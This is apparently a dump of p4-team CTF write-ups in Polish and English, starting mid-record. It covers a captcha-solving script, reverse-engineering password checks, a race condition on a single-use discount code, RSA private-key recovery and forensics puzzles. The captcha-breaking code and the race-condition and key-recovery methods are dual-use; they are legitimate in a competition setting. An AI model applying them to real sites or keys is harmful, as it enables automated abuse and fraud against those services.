symbol_h, symbol_pixels, symbol_x_min, symbol_y_min):\n\t\tcounter = 0\n\t\tblack = (0, 0, 0)\n\t\tfor i in range(symbol_len):\n\t\t\tfor j in range(symbol_h):\n\t\t\t\tif im_pixels[start_x + i, start_y + j] == black:\n\t\t\t\t\tif im_pixels[start_x + i, start_y + j] == symbol_pixels[symbol_x_min + i, symbol_y_min + j]:\n\t\t\t\t\t\tcounter += 1\n\t\t\t\t\telse:\n\t\t\t\t\t\tcounter -= 1\n\t\t\t\telif symbol_pixels[symbol_x_min + i, symbol_y_min + j] == black:\n\t\t\t\t\tcounter -= 1\n\t\treturn counter\n\t\nDla zadanego offsetu (w poziomie - start_x oraz w pionie - start_y) na obrazie z captchą iterujemy po pikselach i porównujemy je z pikselami testowanego symbolu. Jeśli trafimy na czarne piksele na obrazie to sprawdzamy czy występują także w symbolu i dodajemy lub odejmujemy 1 od licznika pasujących pikseli. Jeśli na obrazie mamy kolor biały a symbol ma czarne piksele to odejmujemy 1 od licznika. Ta druga część jest dość istotna, ponieważ w innym wypadku litery \"całkowicie obejmujące inne\" mogłyby być wskazane jako poprawne dopasowanie.\n\n\tdef is_to_remove(symbol_pixels, x, y):\n\t\tblack = (0, 0, 0)\n\t\tresult = False\n\t\tfor i in range(-1, 1):\n\t\t\tfor j in range(-1, 1):\n\t\t\t\tresult = result or symbol_pixels[x + i, y + j] == black\n\t\treturn result\n\n\n\tdef remove_used(picture_pixels, symbol, offset_x, offset_y, symbol_len, symbol_h):\n\t\twhite = (255, 255, 255)\n\t\tsymbol_x_min, _, symbol_y_min, _ = get_coords(symbol)\n\t\tsymbol_pixels = symbol.load()\n\t\tfor i in range(offset_x, offset_x + symbol_len + 1):\n\t\t\tfor j in range(offset_y, offset_y + symbol_h + 1):\n\t\t\t\tif is_to_remove(symbol_pixels, symbol_x_min + i - offset_x, symbol_y_min + j - offset_y):\n\t\t\t\t\tpicture_pixels[i, j] = white\n\nUsuwając symbol z obrazu iterujemy po obrazie zgodnie ze znalezionym offsetem i kolorujemy na biało te piksele, które są czarne także w symbolu. Nie kolorujemy całego boxa na biało! Jest to dość istotne, bo captche czasem były takie:\n\n![](./captcha4.png)\n\nJak widać symbol `5` znajduje sie wewnątrz boxa obejmującego literę `T` i zamalowanie całego boxa na biało \"zniszczy\" symbol `5`.\n\nKod całego solvera dostępny jest [tutaj](./captcha.py). Tak przygotowany solver + pypy i szybki internet pozwolił po pewnym czasie uzyskać flagę:\n\n`DCTF{6b91e112ee0332616a5fe6cc321e48f1}`\n\t\t\n### ENG Version\n\nThe task was to create a captcha breaker. The captcha codes looked like this:\n\n![](./captcha.png)\n\nWe had to solve 1337 examples in a row without any mistakes to get the flag.\n\nAs can be noticed we had to process the image to make it more useful for automatic analysis. We used an algorithm to get a black & white clean version of the text. We used 2 functions for this:\n\n\tdef fix_colors(im):\n\t\tcolors_distribution = im.getcolors(1000)\n\t\tordered = sorted(colors_distribution, key=lambda x: x[0], reverse=True)\n\t\tbest_colors = [color[1] for color in ordered]\n\t\tif (255, 255, 255) in best_colors:\n\t\t\tbest_colors.remove((255, 255, 255))\n\t\tif (0, 0, 0) in best_colors:\n\t\t\tbest_colors.remove((0, 0, 0))\n\t\tbest_colors = best_colors[:2]\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color not in best_colors:\n\t\t\t\t\tpixels[i, j] = best_colors[0]\n\t\treturn best_colors[0]\n\n\n\tdef black_and_white(im, filling):\n\t\tblack = (0, 0, 0)\n\t\twhite = (255, 255, 255)\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color == filling:\n\t\t\t\t\tpixels[i, j] = white\n\t\t\t\telse:\n\t\t\t\t\tpixels[i, j] = black\n\t\t\t\t\t\nFirst one removed all colors except for 2 dominant ones (filling and text), however we skip black and white when looking for dominants, so we don't pick one as filling.\n\nSecond function changes the text color to black and filling color to white. This was we get:\n\n![](./captcha_color.png)\n\nAnd then:\n\n![](./captcha_bw.png)\n\nUnfortunately, as you can notice the captchas are really small. Too small for OCR to give good results. Therefore, we proceed with a different method. One of our teammates mapped the whole alphabet of necessary symbols:\n\n![](./alphabet.png)\n\nCaptcha-solving algorithm:\n\n1. Download captcha\n2. Fix colors and make black & white\n3. Calculate a box with captcha letters\n4. For every alphabet character we calculate the best positioning on the captcha (where it overlaps the most), we save also the offset of this positioning \n5. We pick the character with highest score\n6. We remove the character from captcha by painting it white.\n7. We perform steps 4-6 six times, because we are looking for 6 characters.\n8. We sort the characters by the x_offset of the positioning of the character, to reconstruct the inital order of characters\n\nFor the captcha presented above the decoding session looks like this (the best matched character and picture after removal):\n\n`('H', 155)`\n\n![](./h.png)\n\n`('G', 122)`\n\n![](./g.png)\n\n`('U', 103)`\n\n![](./u.png)\n\n`('E', 99)`\n\n![](./e.png)\n\n`('Z', 86)`\n\n![](./z.png)\n\n`('9', 46)`\n\n![](./9.png)\n\nAs a result we get the code: `EUZGH9`\n\nTwo functions that are worth mentioning are the function to calculate matching score and function for removing the characters from picture.\n\n\tdef test_configuration(im_pixels, start_x, start_y, symbol_len, symbol_h, symbol_pixels, symbol_x_min, symbol_y_min):\n\t\tcounter = 0\n\t\tblack = (0, 0, 0)\n\t\tfor i in range(symbol_len):\n\t\t\tfor j in range(symbol_h):\n\t\t\t\tif im_pixels[start_x + i, start_y + j] == black:\n\t\t\t\t\tif im_pixels[start_x + i, start_y + j] == symbol_pixels[symbol_x_min + i, symbol_y_min + j]:\n\t\t\t\t\t\tcounter += 1\n\t\t\t\t\telse:\n\t\t\t\t\t\tcounter -= 1\n\t\t\t\telif symbol_pixels[symbol_x_min + i, symbol_y_min + j] == black:\n\t\t\t\t\tcounter -= 1\n\t\treturn counter\n\nFor given offset (horizontal - start_x and vertical - start_y) on the captcha picture we iterate over pixels and compare with symbol pixels. If we have black pixels on the picture we check if they are black also in symbol and we add or subtract 1 from the matched pixels counter. If on the picture we have white color but black in symbol we subtract 1 from counter. The second part os really important, because otherwise the large letters that \"cover other letters entirely\" could be selected as best match.\n\n\tdef is_to_remove(symbol_pixels, x, y):\n\t\tblack = (0, 0, 0)\n\t\tresult = False\n\t\tfor i in range(-1, 1):\n\t\t\tfor j in range(-1, 1):\n\t\t\t\tresult = result or symbol_pixels[x + i, y + j] == black\n\t\treturn result\n\n\n\tdef remove_used(picture_pixels, symbol, offset_x, offset_y, symbol_len, symbol_h):\n\t\twhite = (255, 255, 255)\n\t\tsymbol_x_min, _, symbol_y_min, _ = get_coords(symbol)\n\t\tsymbol_pixels = symbol.load()\n\t\tfor i in range(offset_x, offset_x + symbol_len + 1):\n\t\t\tfor j in range(offset_y, offset_y + symbol_h + 1):\n\t\t\t\tif is_to_remove(symbol_pixels, symbol_x_min + i - offset_x, symbol_y_min + j - offset_y):\n\t\t\t\t\tpicture_pixels[i, j] = white\n\nIn order to remove the symbol from picture we iterate over it starting from appropriate offset and color pixels white if they are black in the symbol. We don't color the whole box white! It is important because some captchas were like this:\n\n![](./captcha4.png)\n\nAs can be seen the character `5` is inside the box surrounding letter `T` and paiting it white would \"destroy\" the character `5`. \n\nCode of the solver is available [here](./captcha.py).  This solver + pypy + fast internet connection resulted in:\n\n`DCTF{6b91e112ee0332616a5fe6cc321e48f1}`\n", "timestamp": "2025-10-21T22:03:09.378636"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/re_100_entry/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/re_100_entry/README.md", "content": "﻿## Reverse 100 (re, 100p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./r100) (elf konkretnie), który wykonuje bardzo proste sprawdzenie hasła i odpowiada czy hasło jest poprawne czy nie.\n\nDomyślamy się że poprawne hasło jest flagą.\n\nCały program to coś w rodzaju:\n\n    int main() {\n        printf(\"Enter the password: \");\n        if (fgets(&password, 255, stdin)) {\n            if (check_password(password)) {\n              puts(\"Incorrect password!\");\n            } else {\n              puts(\"Nice!\");\n            }\n        }\n    }\n\nPatrzymy więc w funkcję check_password (oczywiście nie nazywała się tak w binarce, nie dostaliśmy symboli):\n\n    bool check_password(char *password) {\n        char* arr[3] = { \"Dufhbmf\", \"pG`imos\", \"ewUglpt\" };\n        for (i = 0; i <= 11; ++i) {\n            if (v3[8 * (i % 3)][2 * (i / 3)] - password[i] != 1) {\n                return true;\n            }\n        }\n        return false;\n    }\n\nZ równania `v3[8 * (i % 3)][2 * (i / 3)] - password[i] != 1` od razu wynika co trzeba zrobić (coś - hasło ma być równe 1, czyli hasło = coś + 1).\n\nWyliczyliśmy hasło na podstawie podanych stałych i zdobyliśmy flagę.\n\n### ENG version\n\nWe get a [binary](./r100) (elf to be exact), which performs a simple password check and returns if the password was correct or not.\n\nWe expect the password to be the flag.\n\nWhole code is something like: \n\n    int main() {\n        printf(\"Enter the password: \");\n        if (fgets(&password, 255, stdin)) {\n            if (check_password(password)) {\n              puts(\"Incorrect password!\");\n            } else {\n              puts(\"Nice!\");\n            }\n        }\n    }\n\nWe go into the check_password function (of course it was not called like that in the binary, there was no symbol table):\n\n    bool check_password(char *password) {\n        char* arr[3] = { \"Dufhbmf\", \"pG`imos\", \"ewUglpt\" };\n        for (i = 0; i <= 11; ++i) {\n            if (v3[8 * (i % 3)][2 * (i / 3)] - password[i] != 1) {\n                return true;\n            }\n        }\n        return false;\n    }\n\nFrom the equation `v3[8 * (i % 3)][2 * (i / 3)] - password[i] != 1` we can see right away what we need to do (something - password has to be equal to 1 so therefore password+something = 1)\n\nWe simply calculated the password based on the constant values and got the flag.\n", "timestamp": "2025-10-21T22:03:09.640206"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/re_200_link/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/re_200_link/README.md", "content": "﻿## Reverse 200 (re, 200p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./r200) (elf konkretnie), który, podobnie jak poprzedni, wykonuje sprawdzenie hasła i odpowiada czy hasło jest poprawne czy nie.\n\nDomyślamy się że poprawne hasło jest flagą.\n\nCały program to coś w rodzaju:\n\n    int main() {\n        printf(\"Enter the password: \");\n        if (fgets(&password, 255, stdin)) {\n            if (check_password(password)) {\n              puts(\"Incorrect password!\");\n            } else {\n              puts(\"Nice!\");\n            }\n        }\n    }\n\nPatrzymy więc w funkcję check_password. W bardzo dużym uproszczeniu (tak naprawde nie było tu żadnych funkcji wywoływanych, wszystko inlinowane:\n\n    bool check_password(char *password) {\n        int buf[6];\n        int reqired[6] = { 5, 2, 7, 2, 5, 6 };\n        for (int i = 0; i <= 5; i++) {\n            buf[i] = get_from_assoc(list, password[i]);\n        }\n        for (int i = 0; i <= 5; i++) {\n            if (buf[i] != required[i]) {\n                return true;\n            }\n        }\n        return false;\n    }\n\nGdzie list to globalna zmienna - lista asocjacyjna, wyglądająca mniej więcej tak (w nie-C składni):\n\n    {\n        'm': 0,\n        'n': 1,\n        'o': 2,\n        'p': 3,\n        'q': 4,\n        'r': 5,\n        's': 6,\n        't': 7,\n        'u': 8,\n        'v': 9,\n        'w': 10,\n        'x': 11,\n        'y': 12,\n        'z': 13\n    }\n\nZ tego odczytaliśmy wymagane hasło - \"rotors\".\n\n### ENG version\n\nWe get a [binary](./r200) (elf to be exact), which, as previously, performs a password check and returns if the password was correct or not,\n\nWe expect the password to be the flag.\n\nThe code is something like:\n\n    int main() {\n        printf(\"Enter the password: \");\n        if (fgets(&password, 255, stdin)) {\n            if (check_password(password)) {\n              puts(\"Incorrect password!\");\n            } else {\n              puts(\"Nice!\");\n            }\n        }\n    }\n\nWe look at the check_password function. Simplified version (there were no function calls, all inlined):\n\n    bool check_password(char *password) {\n        int buf[6];\n        int reqired[6] = { 5, 2, 7, 2, 5, 6 };\n        for (int i = 0; i <= 5; i++) {\n            buf[i] = get_from_assoc(list, password[i]);\n        }\n        for (int i = 0; i <= 5; i++) {\n            if (buf[i] != required[i]) {\n                return true;\n            }\n        }\n        return false;\n    }\n\nWhere list is a global variable - associative container containing:\n\n    {\n        'm': 0,\n        'n': 1,\n        'o': 2,\n        'p': 3,\n        'q': 4,\n        'r': 5,\n        's': 6,\n        't': 7,\n        'u': 8,\n        'v': 9,\n        'w': 10,\n        'x': 11,\n        'y': 12,\n        'z': 13\n    }\n\nWe used it to read the password - \"rotors\".\n", "timestamp": "2025-10-21T22:03:09.909226"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/re_300_lbs_checker/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/re_300_lbs_checker/README.md", "content": "﻿## Reverse 300 (re, 300p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./r300.exe) (tym razem PE windowsowe), który pobiera od usera parę username:hasło. Mamy zdobyć hasło dla użytkownika \"Administrator\".\n\nOkazuje się dodatkowo że są zabezpieczenia przed bezpośrednim zapytaniem o hasło dla usera \"Administrator\".\n\nProgram po kolei:\n - pyta o username\n - pyta o hasło\n - sprawdza czy w username występuje litera \"A\" - jeśli tak, to hasło nie będzie poprawnie generowane.\n - następnie sprawdza czy hasło ma odpowiednią długość (zależną od nicka - chyba zależność to długość_nicka - 1, ale nie sprawdzaliśmy). Jeśli nie, znowu, nie będzie błędu ale sprawdzenie wykona się niepoprawnie.\n - Następnie następuje sprawdzenie hasła:\n\n```\nfor (int i = 0; i < strlen(password) - 1; i++) {\n    if (!cbc_password_check(dużo obliczeń matematycznych na i, password[i])) {\n        return false;\n    }\n}\n```\n\n - poszliśmy na łatwiznę (a raczej, wybraliśmy optymalne rozwiązanie) - nie reversowaliśmy algorytmu, tylko śledziliśmy co robi funkcja cbc_password_check w każdej iteracji. Robiła ona dużo obliczeń na username, i na podstawie tego sprawdzała jaka powinna być kolejna litera hasła i wykonywała porównanie. Wystarczyło \"prześledzić\" raz przebieg tej funkcji, w debuggerze pominąć returny, i mieliśmy gotowe hasło.\n\nZ tego odczytaliśmy wymagane hasło dla administratora: `#y1y3#y1y3##` i zdobyliśmy flagę.\n\n### ENG version\n\nWe get a [binary](./r300.exe) (this time a windows PE), which takes user:password pair as input. We need a password for \"Administrator\" user.\n\nThere are some additional protection against directly asking for password for \"Administrator\" user.\n\nThe binary:\n - asks for username\n - asks for password\n - checks if there is letter \"A\" in the useraname - if so, the password will not be generated correctly.\n - then it checks is the password has a proper length (depending on the usernaem - something like username_length -1, but we didn't check). If no, again it will not show any errors byt password check will fail.\n - then there is the actual password check:\n\n```\nfor (int i = 0; i < strlen(password) - 1; i++) {\n    if (!cbc_password_check(a lot of mathematical compuations over i, password[i])) {\n        return false;\n    }\n}\n```\n\n- we took the easy path (or the optmimal solution) - we didn't try to reverse the algorithm, but we tracked what the cbc_password_check function was doing in each iteration. It was doing a lot fo computations on username and then it was using this to check what should be the next password letter and was doing the comparison. We only had to \"track\" this function once in a debugger, skip returns and we had the password.\n\nWith this approach we got the password for Administrator: `#y1y3#y1y3##` and we got the flag.", "timestamp": "2025-10-21T22:03:10.146297"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/re_400_master_of_reversing/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/re_400_master_of_reversing/README.md", "content": "﻿## Reverse 400 (re, 400p)\n\n### PL\n[ENG](#eng-version)\n\nNajtrudniejsze zadanie z RE na tym CTFie. Dostajemy [program](./r400) (znowu elf), który pobiera od usera hasło. Domyślamy się że to hasło jest flagą.\n\nTutaj niespodzianka, bo hasło nie jest sprawdzane nigdzie w programie. Po chwili grzebania/debugowania, okazuje się, że hasło jest zamieniane na DWORD (cztery znaki) i pewna tablica bajtów jest \"deszyfrowana\" (tzn. xorowana) z nim, a następnie wykonywana. Xorowane dane wyglądają tak:\n\n    5E 68 0E 59 46 06 47 5E 55 11 15 41 5C 0A 03 16\n    44 0A 08 52 14 16 0E 16 52 0D 13 5E 14 3B 09 43\n    5C 0D 08 45 15 0A 0A 57 40 0B 0E 44 55 16 13 5E\n    77 0D 08 51 8E 48 66 36 34 EB 87 8D 35 62 66 36\n    8C 66 66 36 34 AF E6 8E 35 62 66 36 F9 E2 F6 A6\n\nPierwsze próby zgadnięcia hasła nie udały się (myśleliśmy że może ten fragment to funkcja, i zacznie się jakimś klasycznym prologiem). Ale szybko wpadliśmy na lepszy pomysł. Otóż jaki jest najczęściej spotykany bajt w kodzie? Oczywiście zero. Więc jeśli znajdziemy najczęściej występujący bajt w zaszyfrowanym fragmencie, będziemy wiedzieli że prawdopodobnie były to oryginalnie zera. Kod wyszukujący najczęstsze bajty:\n\n    source = '5E680E594606475E551115415C0A0316440A085214160E16520D135E143B09435C0D0845150A0A57400B0E445516135E770D08518E48663634EB878D356266368C66663634AFE68E35626636F9E2F6A6'.decode('hex')\n    prologue = '554889E5'.decode('hex')\n\n    def xor(a, b):\n        return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n\n    print xor(source, prologue).encode('hex')\n\n    a0 = source[0::4]\n    a1 = source[1::4]\n    a2 = source[2::4]\n    a3 = source[3::4]\n\n    def most_common(x):\n        import collections\n        s = collections.Counter(x).most_common(1)[0]\n        return (s[0].encode('hex'), s[1])\n\n    print most_common(a0),\n    print most_common(a1),\n    print most_common(a2),\n    print most_common(a3),\n\nOkazało się to być strzałem w dziesiątkę! (Jeśli dobrze pamiętamy, jeden z czterech fragmentów źle trafił, ale udało się to już ręcznie poprawić trywialnie).\n\nW ten sposób rozwiązaliśmy najtrudniejsze zadanie RE na CTFie i zdobyliśmy kolejną flagę, wartą 400 punktów.\n\n### ENG version\n\nThe most difficult RE task on this CTF. We get a [binary](./r400) (elf again) which takes password as input. We expect the password to be the flag.\n\nHere we have a surprise, because the password is not checked anywhere in the binary. After a while of debugging we realise that the password is casted into a DWORD (four characters) and a byte table is decoded (via xor) with this DWORD and the executed as code. The xored data are:\n\n    5E 68 0E 59 46 06 47 5E 55 11 15 41 5C 0A 03 16\n    44 0A 08 52 14 16 0E 16 52 0D 13 5E 14 3B 09 43\n    5C 0D 08 45 15 0A 0A 57 40 0B 0E 44 55 16 13 5E\n    77 0D 08 51 8E 48 66 36 34 EB 87 8D 35 62 66 36\n    8C 66 66 36 34 AF E6 8E 35 62 66 36 F9 E2 F6 A6\n\nFirst attempts to get the password failed (we assumed this code block is a function nad has some standard prolog). Soon we got a better idea. What is the most common byte value in the code? Zero of course. So if we find the most common byte in the encoded block we can expect those to be zeroes in the decoded verson. We use the code to measure byte frequency:\n\n    source = '5E680E594606475E551115415C0A0316440A085214160E16520D135E143B09435C0D0845150A0A57400B0E445516135E770D08518E48663634EB878D356266368C66663634AFE68E35626636F9E2F6A6'.decode('hex')\n    prologue = '554889E5'.decode('hex')\n\n    def xor(a, b):\n        return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n\n    print xor(source, prologue).encode('hex')\n\n    a0 = source[0::4]\n    a1 = source[1::4]\n    a2 = source[2::4]\n    a3 = source[3::4]\n\n    def most_common(x):\n        import collections\n        s = collections.Counter(x).most_common(1)[0]\n        return (s[0].encode('hex'), s[1])\n\n    print most_common(a0),\n    print most_common(a1),\n    print most_common(a2),\n    print most_common(a3),\n\nAnd this was a bull's-eye! (If we remeber correctly one of the four fragments were wrong but we could fix those by hand)\nThis way we solved the hardest RE task on the CTF and got another flag worth 400 points.", "timestamp": "2025-10-21T22:03:10.405710"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/web_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/web_100/README.md", "content": "##Web 100 (web, 100p)\n\n###PL\n[ENG](#eng-version)\n\nW zadaniu dostajemy prostą stronę wyświetlającą ilość pieniędzy na koncie oraz okienko do aktywacji kodów. Zostaje nam udostępniony jednorazowy kod doładowujący 10$.\n\nPo użyciu kodu dostajemy komunikat, że ciągle mamy za mało pieniędzy, zatem musimy znaleźć jakiś sposób na wielokrotne użycie tego samego kodu lub rozgryźć jak program weryfikuje kody. Zaczęliśmy od łatwiejszego.\n\nZ kodami rabatowymi kojarzy się szczególnie jeden powszechny exploit: [race condtition](https://www.owasp.org/index.php/Race_Conditions).\n\nUsuwamy ciasteczka żeby pozbyć się sesji i wysyłamy parę zapytań z tym samym kodem jednocześnie, po odświeżeniu strony pokazują nam się najszybciej zarobione pieniądze w życiu, oraz flagę.\n\n### ENG version\n\nWe get a link to a webpage displaying the amount of money on our account and a form for submitting codes. We have a single-use code for 10$.\n\nAfter we use this code we get an information that we still don't have enough money for the flag, so we assume we need to find a way to use the code multiple times or figure out how the system verifies the codes. We started with the simpler one.\n\nThere is a very common error with discount codes: [race condtition](https://www.owasp.org/index.php/Race_Conditions).\n\nWe remove cookies to get rid of current session (with already used code) and we send multiple requests at the same time. After the page loads we can see the fastest earned money in out lifes, and the flag.", "timestamp": "2025-10-21T22:03:10.703248"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/README.md", "content": "# Writeup ASIS CTF Finals 2015\n\nUczestniczyliśmy (Rev, Shalom, other019, nazywam, pp i msm) w finałach ASIS CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n- Pierwszy CTF gdzie pierwsze punkty udało nam się zdobyć dopiero po kilku godzinach.\n- Wyjątkowo dużo zadań nad którymi musieliśmy pracować w kilka osób (robiąc research, pisząc część skryptów etc.). Zwykle jedno zadanie rozwiązuj 1-2 osoby, tutaj było kilka nad którymi pracowały 3-4 osoby na raz.\n- Przeważająca większość zadań to re, pwn i crypto, czyli generalnie kategorie w których nie jesteśmy najmocniejsi. \n\nOpisy zadań po kolei.\n\n# Spis treści:\n* [AsisHash (re 150)](re_150_asishash)\n* [Big Lie (forensic 100)](forensic_100_big_lie)\n* [Bodu (crypto 175)](crypto_175_bodu)\n* [Calcexec I (pwn 200)](pwn_200_calcexec_I)\n* [Calm Down (trivia 75)](trivia_75_calm_down)\n* [ExampleFlag (trivia 1)](trivia_1_example_flag)\n* [Fake (re 150)](re_150_fake)\n* [FlagHunter (misc 75)](misc_75_flaghunter)\n* [Impossible (web 225)](web_225_impossible)\n* [License (re 125)](re_100_license)\n* [MeowMeow (misc 75)](misc_75_meowmeow)\n* [Shop-1 (pwn 100)](pwn_100_shop_1)\n* [Strange (forensic 150)](forensic_150_strange)\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:03:11.251986"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/crypto_175_bodu/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/crypto_175_bodu/README.md", "content": "## Bodu (crypto, 175p)\n\n###PL\n[ENG](#eng-version)\n\nZostają nam dane [klucz publiczny](pub.key) i [zaszyfrowana wiadomość](flag.enc), zacznijmy od spojrzenia jak wygląda klucz publiczny:\n\n![alt text](pubkey.png)\n\nOd razu rzuca się w oczy dosyć spory exponent (najczęściej widzi się należące do liczb pierwszy Fermata, a więc `3, 5, 17, 256, 65536`)\n\nCzyli szukamy jakiegoś ataku na RSA(możliwe, że exponent), z pomocą przychodzi nam [Boneh Durfee Attack](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage)\n\nUżycie sprowadza się do podstawienia naszego n i e, po chwili dostajemy:\n\n`=== solutions found ===\nx: 166655144474518261230652989223296290941028672984834812738633465334956148666716172\ny: -1620506135779940147224760304039194820968390775056928694397695557680267582618799089782283100396517871978055320094445221632538028739201519514071704255517645\nd: 89508186630638564513494386415865407147609702392949250864642625401059935751367507\n\n=== 0.260915994644 seconds ===`\n\n[Podstawiamy](solve.py) do `pow(ciphertext, d, n)` iiiii....\n\n![alt text](odd.png)\n\nTo nie dobrze, może spróbujemy dodać `0` na początku?\n\n`\u0002)ò~Ðã\u001aüéÛaû¨0\u0017\u0017JÀîr|¹Â|Ú÷û5Ù° \u000er'{§¯\u00010âËúJ4Þ¤<úô!EþX}êïî³Ë?g/óF>gá}þ74|ú(¾¶H\u0005\u001cASIS{b472266d4dd916a23a7b0deb5bc5e63f}`\n\n### ENG version\n\nIn this task, we're given a [public key](pub.key) and a [encrypted message](flag.enc), let's start by looking inside the public key:\n\n![alt text](pubkey.png)\n\nThe exponent seems quite high(you usually see exponents from the set of Fermat primes, `3, 5, 17, 256, 65536`)\n\nSo we're looking for an RSA attack(possibly including the high exponent), after some googling we come across a [Boneh Durfee Attack](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage)\n\nUsing it comes down to just entering our n and e, after a while of computing the program outputs:\n\n`=== solutions found ===\nx: 166655144474518261230652989223296290941028672984834812738633465334956148666716172\ny: -1620506135779940147224760304039194820968390775056928694397695557680267582618799089782283100396517871978055320094445221632538028739201519514071704255517645\nd: 89508186630638564513494386415865407147609702392949250864642625401059935751367507\n\n=== 0.260915994644 seconds ===`\n\nGreat, let's try to decipher the message using that d by [calculating](solve.py) the value of pow(ciphertext, d, n)\n\n![alt text](odd.png)\n\nThat's weird, maybe a 0 at the beginning will help?\n\n`\u0002)ò~Ðã\u001aüéÛaû¨0\u0017\u0017JÀîr|¹Â|Ú÷û5Ù° \u000er'{§¯\u00010âËúJ4Þ¤<úô!EþX}êïî³Ë?g/óF>gá}þ74|ú(¾¶H\u0005\u001cASIS{b472266d4dd916a23a7b0deb5bc5e63f}`\n", "timestamp": "2025-10-21T22:03:11.500075"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/forensic_100_big_lie/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/forensic_100_big_lie/README.md", "content": "﻿## Big Lie (forensic, 100p, 101 solves)\n\n> Find the [flag](biglie.pcap).\n\n### PL\n[ENG](#eng-version)\n\nOtrzymany plik pcap ładujemy do Wiresharka i na podstawie wyeksportowanych obiektach z sesji HTTP dochodzimy do wniosku, że użytkownik skorzystał z usługi pastebin, która przed wysłaniem danych szyfruje je lokalnie, a klucz przesyłany jest za pomocą części \"fragment\" (to, co za `#`) URLa. Jest to część, która nie jest częścią requestu HTTP i nie jest przesyłana serwerowi (i tym samym nie znalazło się w zrzucie danych sieciowych).\n\nAle po dalszej analizie sesji HTTP znajdujemy pełnego URLa (razem z kluczem) w requestach do wewnętrznej usługi monitorującej ruch.\n\n![](img1.png)\n\nPo urldecode:\n![](img2.png)\n\nZawartość \"pasty\":\n![](img3.png)\n\nPo przeklejeniu do edytora z wyłączonym word-wrap:\n![](img4.png)\n\n`ASIS{e29a3ef6f1d71d04c5f107eb3c64bbbb}`\n\n### ENG version\n\nWe load the inpit pcap file in Wireshark and based on the exported HTTP session objects we conclude that the user was using pastebin service which locally encrypts the data before sending them, and the key is sent via \"fragment\" of the URL (what is after `#`). It's the part that is not a part of HTTP request and is not sent to the server (and therefore it's not in the network communication dump).\n\nHowever after firther analysis of the HTTP session we find the full URL (the encryption key included) in requests for internal traffic monitoring service.\n\n![](img1.png)\n\nAfter urldecode:\n![](img2.png)\n\npastebin contents:\n![](img3.png)\n\nWhen placed in an editor with word-wrap:\n![](img4.png)\n\n`ASIS{e29a3ef6f1d71d04c5f107eb3c64bbbb}`", "timestamp": "2025-10-21T22:03:11.772013"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/forensic_150_strange/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/forensic_150_strange/README.md", "content": "##Strange 150 (forensics, 150p)\n\n### PL\n[ENG](#eng-version)\n\nW tym zadaniu zostanie przetestowana nasza umiejętność otwierania dużych obrazków, dostajemy plik [strange.png](strange.png) ważący 16MB ale pojawia się jeden problem:\n\n![alt](file.png)\n\nTak, zgadza się, obrazek ma `344987x344987` pikseli, nawet z 1 bitową mapą daje nam dużo za dużo wymaganej pamięci.\n\n(Tutaj spędziliśmy trochę czasu na próbowanie gotowych programów obsługujących duże pliki, lecz nie przyniosło to żadnego efektu więc tą część pomijamy :) )\n\nNależałoby zaglądnąć do środka tej binarki, żeby dowiedzieć się co tak na prawdę tam w środku siedzi. \n\nOkazuje się, że znaczną większość pliku stanowią nullbyte-y. Więc w sumie spróbujmy wyciąć linijki z samymi nullami, zmniejszmy rozmiar obrazka w EXIFie i zobaczmy co się stanie...\n\n![alt](cropped_enlarged.png)\n\nTeraz tylko spróbujmy je posklejać i...\n\n![alt](solution.png)\n\nFlaga jest nasza!\n\n### ENG version\n\nIn this task we're given an 16MB [png image](strange.png), there's just one problem:\n\n![alt](file.png)\n\nYes, that's right, it's `344987x344987` pixels big, even with 1 bit map, it's still too much to even consider trying viewing it.\n\n(Insert 2 hours of trying various programs with little success here)\n\nWhy don't we look inside the image, maybe we could find out something interesting.\n\nIt turns out that a huge majority of the file is just null bytes. Let's try to cut lines composed of only nulls and edit the image exif data to make it smaller\n\n![alt](cropped_enlarged.png)\n\nSome weird binary lines, how about sticking them together?\n\n![alt](solution.png)\n\nThe flag is ours! (Just be careful with 1's and f's)\n", "timestamp": "2025-10-21T22:03:12.025973"}
